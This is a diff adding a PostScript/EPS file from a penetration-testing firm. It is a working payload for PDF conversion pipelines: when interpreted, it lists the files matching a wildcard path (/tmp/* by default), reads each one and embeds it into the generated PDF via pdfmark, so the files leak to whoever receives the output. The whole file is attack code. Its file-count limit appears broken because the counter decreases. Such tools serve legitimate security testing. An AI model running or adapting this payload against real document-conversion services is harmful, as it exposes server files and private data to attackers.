@@ -1,0 +1,179 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%Pages: 1
+%%BoundingBox:   0 0 1000 1000
+%%LanguageLevel: 1
+%%EndComments
+%%BeginProlog
+%%EndProlog
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%                                      %
+%  RedTeam Pentesting GmbH             %
+%  kontakt@redteam-pentesting.de       %
+%  https://www.redteam-pentesting.de/  %
+%                                      %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%% Configurable Variables
+
+% How many files can be included at most
+/maxFileCount 100 def
+
+% The folder with wildcard which will be embedded
+/targetFolder (/tmp/*) def
+
+% Enables printing error information to the page
+/printErrors false def
+
+%%%%%%%%%%%%%%%%%%% Page Setup
+
+printErrors {
+    /xposinit 0 def
+
+    % how many chars per line
+    /charactercount 100 def
+
+    % white page
+    1 1 1 setrgbcolor clippath fill
+    % black text
+    0 0 0 setrgbcolor
+
+    /pagewidth currentpagedevice /PageSize get 0 get def
+    /pageheight currentpagedevice /PageSize get 1 get def
+
+    % calculate the character width
+    /characterWidth pagewidth xposinit sub charactercount 2 add div def
+
+    /Courier findfont setfont
+
+    /curWidth (-) stringwidth pop def
+
+    /Courier findfont characterWidth curWidth div scalefont setfont
+
+    /lineheight characterWidth curWidth div def
+
+    % initial x and y positions
+    /yposinit pageheight lineheight sub def
+
+    /xpos xposinit def
+    /ypos yposinit def
+    xpos ypos moveto
+} if
+
+%%%%%%%%%%%%%%%%%%% Helper Functions
+
+% Concatenate two strings
+% https://stackoverflow.com/questions/12378904/postscript-concatenate-two-strings
+% (a) (b) -> (ab)
+/concatstrings { exch dup length
+ 2 index length add string
+ dup dup 4 2 roll copy length
+ 4 -1 roll putinterval
+} bind def
+
+% Find findString in targetString and replace it with replaceWithString
+% https://comp.lang.postscript.narkive.com/lb2y58U5/string-replace-in-postscript
+% replaceWithString targetString findString findandreplaceall outString
+/findandreplaceall {
+    () 4 1 roll % string' is an empty string initially.
+    {
+        search { % string' replace post find pre
+            3 index concatstrings 5 -1 roll % replace post find tail' string'
+            exch concatstrings 4 1 roll % string' replace post find
+        } {
+            exch pop concatstrings
+            exit
+        } ifelse
+    } loop
+} bind def
+
+% Move to new line and go to next page if current page is full
+% lineheight newline -
+/newline {
+    /lineheight exch def
+
+    % new page if we are at the bottom of the page
+    ypos lineheight lt {
+        showpage
+        /xpos xposinit def
+        /ypos yposinit def
+        xpos ypos moveto
+    } if
+
+    % decrease y position
+    ypos lineheight sub
+    /ypos exch def
+
+    % move cursor
+    xpos ypos moveto
+} def
+
+% Embeds the file located at parameter 1 into the PDF
+% https://ghostscript.com/blog/zugferd.html
+% inputFile inputFileName EmbedFile -
+/EmbedFile {
+    /inputFileName exch def
+    /inputFile exch def
+    % As pdfmark does not support dynamically generated objname's, generate the code dynamically and replace the name with a dynamically generated one
+    ({) inputFileName concatstrings (Stream}) concatstrings (
+        [ /_objdef {InvoiceStream} /type /stream /OBJ pdfmark
+        [ {InvoiceStream} << /Type /EmbeddedFile /Subtype (application/octet-stream) cvn >> /PUT pdfmark
+        [ {InvoiceStream} inputFile /PUT pdfmark
+        [ {InvoiceStream} /CLOSE pdfmark
+        [ /Name inputFileName /FS <<
+            /Type /FileSpec
+            /F inputFileName
+            /AFRelationship /Alternative
+            /EF << /F {InvoiceStream} >>
+        >> /EMBED pdfmark
+    ) ({InvoiceStream}) findandreplaceall cvx exec
+} def
+
+% Prints the current errorname onto the page if error printing is enabled
+% preErrorMessage printError -
+/printError {
+    /preErrorMessage exch def
+    printErrors {
+        % if an error occurs, the cause is printed onto the page
+        /errormessage {
+            $error /errorname get 50 string cvs
+        } def
+        preErrorMessage show
+        lineheight newline
+        errormessage show
+        lineheight newline
+    } if
+} def
+
+%%%%%%%%%%%%%%%%%%% Actual Code
+
+% Create dictionary which will store the filenames
+/fileCount 0 def
+
+targetFolder { %filenameforall
+    /currentFileName exch def
+
+    % Only include at most maxFileCount files
+    fileCount maxFileCount eq {
+        exit
+    } if
+
+    /fileCount fileCount 1 sub def
+
+    % First try to read the file
+    {
+        /currentFile currentFileName (r) file def
+    } stopped {
+        % if an error occured, we can properly clear the stack
+        pop pop pop
+        (opening file ") currentFileName concatstrings (" failed : ) concatstrings printError
+    }{
+        % if no error occured while reading the file, embed it
+        {
+            currentFile currentFileName EmbedFile
+        } stopped {
+            (embedding file ") currentFileName concatstrings (" failed : ) concatstrings printError
+        } {} ifelse
+    } ifelse
+
+} 4096 string filenameforall
